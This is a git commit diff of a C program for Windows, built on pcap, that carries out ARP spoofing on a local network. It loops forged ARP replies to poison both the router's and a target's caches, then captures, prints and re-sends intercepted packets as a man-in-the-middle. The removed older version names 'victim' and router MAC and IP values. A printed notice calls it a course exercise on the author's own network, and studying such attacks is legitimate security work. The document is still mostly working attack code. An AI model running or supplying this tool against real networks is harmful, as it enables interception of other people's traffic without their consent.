88bf5d828ffddd4137816508943fa4983154e780
Prabesh Marasini <prabeshmarasini1245@gmail.com>
2025-03-25 21:32:07 +0545

    Spoofing all the packets in LAN

--- src/ARPspoof/arpspoof.c
+++ src/ARPspoof/arpspoof.c
@@ -1,114 +1,192 @@
-#include <pcap.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
+#include <pcap.h>
 #include <winsock2.h>
 #include <windows.h>
 
+#pragma comment(lib, "wpcap.lib")
+#pragma comment(lib, "ws2_32.lib")
+
 #define ETHER_ADDR_LEN 6
+#define ARP_REQUEST 1
+#define ARP_REPLY 2
 
 struct eth_header {
-    u_char dest_mac[ETHER_ADDR_LEN];
-    u_char src_mac[ETHER_ADDR_LEN];
-    u_short eth_type;
+    unsigned char dest[ETHER_ADDR_LEN];
+    unsigned char src[ETHER_ADDR_LEN];
+    unsigned short type;
 };
 
 struct arp_header {
-    u_short htype;
-    u_short ptype;
-    u_char hlen;
-    u_char plen;
-    u_short opcode;
-    u_char sender_mac[ETHER_ADDR_LEN];
-    u_char sender_ip[4];
-    u_char target_mac[ETHER_ADDR_LEN];
-    u_char target_ip[4];
+    unsigned short htype;
+    unsigned short ptype;
+    unsigned char hlen;
+    unsigned char plen;
+    unsigned short opcode;
+    unsigned char sender_mac[ETHER_ADDR_LEN];
+    unsigned char sender_ip[4];
+    unsigned char target_mac[ETHER_ADDR_LEN];
+    unsigned char target_ip[4];
 };
 
-void mac_str_to_bytes(const char *mac_str, u_char *mac_bytes) {
-    sscanf(mac_str, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx", 
-        &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], 
-        &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
+static const unsigned char broadcast_mac[ETHER_ADDR_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+
+void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
+    pcap_t *handle = (pcap_t *)param;
+    struct eth_header *eth = (struct eth_header *)pkt_data;
+
+    unsigned char *ip_data = (unsigned char *)(pkt_data + 14);
+    unsigned char src_ip[4], dest_ip[4];
+
+    if (eth->type == htons(0x0800)) {
+        memcpy(src_ip, ip_data + 12, 4);
+        memcpy(dest_ip, ip_data + 16, 4);
+        
+        printf("\nPacket captured - Length: %d\n", header->len);
+        printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+               eth->src[0], eth->src[1], eth->src[2], eth->src[3], eth->src[4], eth->src[5]);
+        printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+               eth->dest[0], eth->dest[1], eth->dest[2], eth->dest[3], eth->dest[4], eth->dest[5]);
+        printf("Source IP: %d.%d.%d.%d\n", src_ip[0], src_ip[1], src_ip[2], src_ip[3]);
+        printf("Destination IP: %d.%d.%d.%d\n", dest_ip[0], dest_ip[1], dest_ip[2], dest_ip[3]);
+    } else if (eth->type == htons(0x0806)) {
+        struct arp_header *arp = (struct arp_header *)(pkt_data + 14);
+        
+        printf("\nARP Packet - Length: %d\n", header->len);
+        printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+               eth->src[0], eth->src[1], eth->src[2], eth->src[3], eth->src[4], eth->src[5]);
+        printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+               eth->dest[0], eth->dest[1], eth->dest[2], eth->dest[3], eth->dest[4], eth->dest[5]);
+        printf("Sender IP: %d.%d.%d.%d\n", arp->sender_ip[0], arp->sender_ip[1], arp->sender_ip[2], arp->sender_ip[3]);
+        printf("Target IP: %d.%d.%d.%d\n", arp->target_ip[0], arp->target_ip[1], arp->target_ip[2], arp->target_ip[3]);
+    }
+
+    if (pcap_sendpacket(handle, pkt_data, header->len) != 0) {
+        printf("Error forwarding packet: %s\n", pcap_geterr(handle));
+    } else {
+        printf("Packet forwarded\n");
+    }
 }
 
-void send_arp_spoof(pcap_t *handle, u_char *attacker_mac, u_char *victim_ip, u_char *router_ip) {
-    u_char packet[42]; 
-
+void send_arp_packet(pcap_t *handle, unsigned char *src_mac, unsigned char *src_ip,
+                    unsigned char *target_mac, unsigned char *target_ip, int opcode) {
+    unsigned char packet[42];
     struct eth_header *eth = (struct eth_header *)packet;
-    struct arp_header *arp = (struct arp_header *)(packet + sizeof(struct eth_header));
+    struct arp_header *arp = (struct arp_header *)(packet + 14);
 
-    memset(packet, 0, sizeof(packet));
+    memcpy(eth->dest, (opcode == ARP_REQUEST) ? broadcast_mac : target_mac, ETHER_ADDR_LEN);
+    memcpy(eth->src, src_mac, ETHER_ADDR_LEN);
+    eth->type = htons(0x0806);
 
-    memset(eth->dest_mac, 0xFF, ETHER_ADDR_LEN); 
-    memcpy(eth->src_mac, attacker_mac, ETHER_ADDR_LEN);
-    eth->eth_type = htons(0x0806);
-
-    arp->htype = htons(1);   
-    arp->ptype = htons(0x0800); 
+    arp->htype = htons(1);
+    arp->ptype = htons(0x0800);
     arp->hlen = 6;
     arp->plen = 4;
-    arp->opcode = htons(2); 
+    arp->opcode = htons(opcode);
+    memcpy(arp->sender_mac, src_mac, ETHER_ADDR_LEN);
+    memcpy(arp->sender_ip, src_ip, 4);
+    memcpy(arp->target_mac, target_mac, ETHER_ADDR_LEN);
+    memcpy(arp->target_ip, target_ip, 4);
 
-    memcpy(arp->sender_mac, attacker_mac, ETHER_ADDR_LEN);
-    memcpy(arp->sender_ip, router_ip, 4);
-    memset(arp->target_mac, 0x00, ETHER_ADDR_LEN); 
-    memcpy(arp->target_ip, victim_ip, 4);
-
-    if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
-        fprintf(stderr, "Error sending ARP packet: %s\n", pcap_geterr(handle));
-    } else {
-        printf("ARP Spoofing packet sent!\n");
+    if (pcap_sendpacket(handle, packet, 42) != 0) {
+        printf("Error sending ARP packet: %s\n", pcap_geterr(handle));
     }
 }
 
-int main() {
+char *select_interface() {
     pcap_if_t *alldevs, *d;
-    pcap_t *handle;
     char errbuf[PCAP_ERRBUF_SIZE];
-    int i = 0, dev_num;
-    u_char attacker_mac[6];
-    u_char victim_mac[6];
-    u_char router_mac[6];
-
-    mac_str_to_bytes("38-68-93-99-72-62", attacker_mac); // Your MAC
-    mac_str_to_bytes("66-7E-53-52-73-50", victim_mac);   // Victim MAC
-    mac_str_to_bytes("04-75-F9-54-88-60", router_mac);   // Router MAC
-
-    u_char victim_ip[4] = {192, 168, 1, 73};  // Victim IP
-    u_char router_ip[4] = {192, 168, 1, 254}; // Router IP
+    int i = 0, choice;
 
     if (pcap_findalldevs(&alldevs, errbuf) == -1) {
-        printf("Error finding devices: %s\n", errbuf);
-        return 1;
+        printf("Error in pcap_findalldevs: %s\n", errbuf);
+        exit(1);
     }
 
-    printf("Available network interfaces:\n");
+    printf("\nAvailable network interfaces:\n");
     for (d = alldevs; d; d = d->next) {
         printf("%d. %s\n", ++i, d->name);
+        if (d->description)
+            printf("   Description: %s\n", d->description);
+        else
+            printf("   No description available\n");
     }
 
     if (i == 0) {
-        printf("No interfaces found.\n");
-        return 1;
+        printf("No interfaces found! Make sure Npcap/WinPcap is installed.\n");
+        pcap_freealldevs(alldevs);
+        exit(1);
     }
-    printf("Enter interface number (1-%d): ", i);
-    scanf("%d", &dev_num);
+
+    printf("\nEnter the interface number (1-%d): ", i);
+    scanf("%d", &choice);
+
+    if (choice < 1 || choice > i) {
+        printf("Invalid choice!\n");
+        pcap_freealldevs(alldevs);
+        exit(1);
+    }
+
     d = alldevs;
-    for (i = 1; i < dev_num; i++) d = d->next;
+    for (i = 1; i < choice; i++) d = d->next;
 
-    handle = pcap_open_live(d->name, 65536, 1, 1000, errbuf);
+    char *dev = _strdup(d->name);
+    printf("Selected interface: %s\n", dev);
+    if (d->description)
+        printf("Description: %s\n", d->description);
+
+    pcap_freealldevs(alldevs);
+    return dev;
+}
+
+DWORD WINAPI capture_thread(LPVOID param) {
+    pcap_t *handle = (pcap_t *)param;
+    pcap_loop(handle, 0, packet_handler, (u_char *)handle);
+    return 0;
+}
+
+int main() {
+    pcap_t *handle;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    char *dev = select_interface();
+    unsigned char src_mac[ETHER_ADDR_LEN] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
+    unsigned char src_ip[4] = {192, 168, 1, 100};
+    unsigned char router_ip[4] = {192, 168, 1, 1};
+    unsigned char target_ip[4] = {192, 168, 1, 101};
+    unsigned char target_mac[ETHER_ADDR_LEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+    printf("\nPublic Notice: This is a practical exercise for my Digital Forensics course.\n");
+    printf("I own the router (IP: %d.%d.%d.%d), my PC, and mobile device on this network.\n",
+           router_ip[0], router_ip[1], router_ip[2], router_ip[3]);
+    printf("Performing ARP spoofing on my own network for educational purposes.\n\n");
+
+    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
-        printf("Error opening device: %s\n", errbuf);
+        printf("Couldn't open device %s: %s\n", dev, errbuf);
+        free(dev);
         return 1;
     }
 
-    printf("Spoofing ARP cache of victim...\n");
+    HANDLE thread = CreateThread(NULL, 0, capture_thread, handle, 0, NULL);
+    if (thread == NULL) {
+        printf("Error creating thread\n");
+        pcap_close(handle);
+        free(dev);
+        return 1;
+    }
+
     while (1) {
-        send_arp_spoof(handle, attacker_mac, victim_ip, router_ip);
+        send_arp_packet(handle, src_mac, target_ip, target_mac, router_ip, ARP_REPLY);
+        printf("Spoofed router: Sent ARP reply\n");
+
+        send_arp_packet(handle, src_mac, router_ip, target_mac, target_ip, ARP_REPLY);
+        printf("Spoofed target: Sent ARP reply\n");
+
         Sleep(2000);
     }
 
-    pcap_freealldevs(alldevs);
+    WaitForSingleObject(thread, INFINITE);
     pcap_close(handle);
+    free(dev);
     return 0;
 }
